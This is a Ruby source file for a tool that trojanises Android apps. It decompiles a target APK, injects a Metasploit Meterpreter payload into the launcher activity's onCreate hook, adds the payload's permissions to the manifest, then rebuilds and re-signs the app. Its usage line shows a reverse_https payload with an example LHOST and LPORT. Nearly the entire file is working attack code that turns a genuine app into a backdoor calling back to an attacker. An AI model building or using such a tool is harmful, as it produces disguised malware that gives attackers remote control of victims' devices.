# Embed a Metasploit Payload in an Original .Apk File 
class EmbedApk
  def initialize(workingDIR,tempDir,targetAPK,toolsDir,msfvenomOpts)
	  # Set main variables
	  @workingDIR = workingDIR  # Script workingDIR
	  @tempDir    = tempDir+randomString(7) # Temp folder dir
	  @targetAPK  = targetAPK # Target apk
	  @toolsDir   = @workingDIR+toolsDir # Embedding tools dir 
	  @msfvenomOpts = msfvenomOpts
      mainScreen()
	  embeddingPayload()
  end
  # Find the activity thatapk_backdoor.rb  is opened when you click the app icon
  def launcherActivity(amanifest)
     package = amanifest.xpath("//manifest").first['package']
     activities = amanifest.xpath("//activity|//activity-alias")
     for activity in activities 
        activityname = activity.attribute("name")
        category = activity.search('category')
        unless category
            next
        end
        for cat in category
            categoryname = cat.attribute('name')
            if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                activityname = activityname.to_s
                unless activityname.start_with?(package)
                    activityname = package + activityname
                end
                return activityname
            end
        end
     end
  end

  # If XML parsing of the manifest fails, recursively search
  # the smali code for the onCreate() hook and let the user
  # pick the injection point
  def scrapeFilesForLauncherActivity(a)
		smali_files||=[]
		Dir.glob(a+'/smali*/**/*.smali') do |file|
		checkFile=File.read(file)
		if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
			smali_files << file
			smalifile = file
			activitysmali = checkFile
		end
		end
		i=0
		messagePrint("Please choose from one of the following:","info")
		smali_files.each{|s_file|
			messagePrint("Hook point #{i} : #{s_file}","succeed")
			i+=1
		}
		hook=-1
		while (hook < 0 || hook>i)
			messagePrint("\nHook: ","info")
			hook = STDIN.gets.chomp.to_i
		end
		i=0
		smalifile=""
		activitysmali=""
		smali_files.each{|s_file|
			if (i==hook)
				checkFile=File.read(s_file)
				smalifile=s_file
				activitysmali = checkFile
				break
			end
			i+=1
		}
		return [smalifile,activitysmali]
  end

  # Fix manifest permissions
  def fixManifest(a , b)
	payload_permissions=[]
	#Load payload's permissions
	File.open(a+"/AndroidManifest.xml","r"){|file|
		k=File.read(file)
		payload_manifest=Nokogiri::XML(k)
		permissions = payload_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			payload_permissions << name.to_s
		end
	}
	original_permissions=[]
	apk_mani=''
	
	#Load original apk's permissions
	File.open(b+"/AndroidManifest.xml","r"){|file2|
		k=File.read(file2)
		apk_mani=k
		original_manifest=Nokogiri::XML(k)
		permissions = original_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			original_permissions << name.to_s
		end
	}
	#Get permissions that are not in original APK
	add_permissions=[]
	for permission in payload_permissions
		if !(original_permissions.include? permission)
			messagePrint("Adding #{permission}","succeed")
			add_permissions << permission
		end
	end
	inject=0
	new_mani=""
	#Inject permissions in original APK's manifest
	for line in apk_mani.split("\n")
		if (line.include? "uses-permission" and inject==0)
			for permission in add_permissions
				new_mani << '<uses-permission android:name="'+permission+'"/>'+"\n"
			end
			new_mani << line+"\n"
			inject=1
		else
			new_mani << line+"\n"
		end
	end
	File.open(b+"/AndroidManifest.xml", "w") {|file| file.puts new_mani }
  end

  # Generate random String  
  def randomString(size = 6)
   charset = %w{ 2 3 4 6 7 9 A C D E F G H J K M N P Q R T V W X Y Z}
   (0...size).map{ charset.to_a[rand(charset.size)] }.join
  end

  # Print script messages
  def messagePrint(message,type='info')
	  case type
	    when 'info'
			@return = "[*] #{message}".cyan
        when 'error'
			@return = "[!] #{message}".red
			`rm -rf #{@tempDir}`
		when 'succeed'			
			@return = "[+] #{message}".green
		when 'step'
			@return = message.yellow		
       else
		   @return = "[*] #{message}".cyan	
	  end
	  puts @return+"\n"
  end
  
  # Checks dependency and set variables
  def mainScreen

      unless (@targetAPK)
		  messagePrint("Usage: #{$0} {target.apk} [msfvenom options]","error")
		  messagePrint("e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443","info")
		  exit(1)
	  end
	  unless (File.readable?(@targetAPK))
		  @getTargetAPK = File.basename(@targetAPK)
		  messagePrint("#{@getTargetAPK} not found.")
		  exit(1)
	  end
	  signingAPK = "#{@toolsDir}signapk/signapk.jar"
	  unless (signingAPK && File.readable?(signingAPK))
		  getToolsDir = File.dirname(@toolsDir)
		  messagePrint("Signapk.jar not found. Make sure it has been included in #{getToolsDir}","error")
		  exit(1)
	  end
	  apkTool = `which apktool`
	  unless (apkTool && apkTool.length >0)
		  messagePrint("ApkTool is required for embedding,Make sure it has been install","error")
		  exit(1)
	  end
	  apkToolVersion = `apktool`
	  unless (apkToolVersion.split()[1].include?("v2."))
		  messagePrint("apktool version #{apkToolVersion} not supported, please download the latest 2. version from git","error")
		  exit(1)
	  end
	  unless (File.readable?(@tempDir))
		  `mkdir #{@tempDir}`
	  end
	  @payloadAPK  = "#{@tempDir}/payload.apk"
      @originalAPK = "#{@tempDir}/original.apk"
      @signAPK  = "#{@tempDir}/signapk.apk"
      @payloadDir  = "#{@tempDir}/payload"
      @originalDir = "#{@tempDir}/original"	  

  end
 def embeddingPayload
  # Generate msfvenom payload
	  messagePrint("[1] Generating msfvenom payload","step")
	  res = `msfvenom -f raw #{@msfvenomOpts} -o #{@payloadAPK} 2>&1`
	  if res.downcase.include?("invalid" || "error")
		  messagePrint(res,"error")
		  exit(1)
      end		  
  # Signing payload
      messagePrint("[2] Signing payload","step")
	  `java -jar #{@toolsDir}signapk/signapk.jar #{@toolsDir}signapk/certificate.pem #{@toolsDir}signapk/key.pk8 #{@payloadAPK} #{@signAPK}`
	  `cp #{@targetAPK} #{@originalAPK}`   
  	  
  # Decomposing original and payload APK
	  messagePrint("[3] Decomposing original APK","step")
	  `apktool d #{@originalAPK} -o #{@originalDir}`
	  messagePrint("[4] Decomposing payload APK","step")
	  `apktool d #{@signAPK} -o #{@payloadDir}`	   

  # Locating onCreate() hook
	  f = File.open("#{@originalDir}/AndroidManifest.xml")
	  androidManifest = Nokogiri::XML(f)
      f.close
	  messagePrint("[5] Locating onCreate() hook","step")
	  launcheractivity = launcherActivity(androidManifest)
      smalifile = @originalDir+'/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
	  begin
	    activitysmali = File.read(smalifile)
     rescue Errno::ENOENT
	   messagePrint("Unable to find correct hook automatically","info")
	  begin
		results = scrapeFilesForLauncherActivity(@originalDir)
		smalifile = results[0]
		activitysmali = results[1]
	 rescue
		messagePrint("Error finding launcher activity","error")
 		exit(1)
  	end
   end

  # Copying payload files
	  messagePrint("[6] Copying payload files","step")
      FileUtils.mkdir_p("#{@originalDir}/smali/com/metasploit/stage/")
      FileUtils.cp Dir.glob("#{@payloadDir}/smali/com/metasploit/stage/Payload*.smali"), "#{@originalDir}/smali/com/metasploit/stage/"
      activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
      payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
      hookedsmali = activitysmali.gsub(activitycreate, payloadhook)

  # Injecting payload  	   	  
	 getsmalifile = File.basename(smalifile)
	 messagePrint("[7] Loading #{getsmalifile} and injecting payload","step")
	 File.open(smalifile, "w") {|file| file.puts hookedsmali }
     @injectedApk= "#{@tempDir}/"+@targetAPK.split(".")[0]
     @injectedApk+="_embedded.apk"

  # Poisoning the manifest with meterpreter permissions
	 fixManifest(@payloadDir,@originalDir)
  # Rebuilding
	 messagePrint("[8] Rebuilding #{@targetAPK} with metasploit payload","step")
	 `apktool b -o #{@injectedApk} #{@originalDir}`
	 unless (File.readable?(@injectedApk))
		 messagePrint("Upgrade apktool to the latest apktool.jar fixes the issue completely","error")
		 exit(1)
	 end
 
  # Signing
	 getSignapk = File.basename(@injectedApk)
	 getTargetAPK = File.basename(@targetAPK)
	 messagePrint("[9] Signing #{getSignapk}","step")
	 `java -jar #{@toolsDir}signapk/signapk.jar #{@toolsDir}signapk/certificate.pem #{@toolsDir}signapk/key.pk8 #{@injectedApk} #{@workingDIR}/#{getTargetAPK}_embedded.apk`
  # embedding end
	getTargetAPK = File.basename(@targetAPK)
	 messagePrint("#{getTargetAPK} has been embedded,#{getTargetAPK}_embedded.apk","succeed")
	 `rm -rf #{@tempDir}`

 end
end  
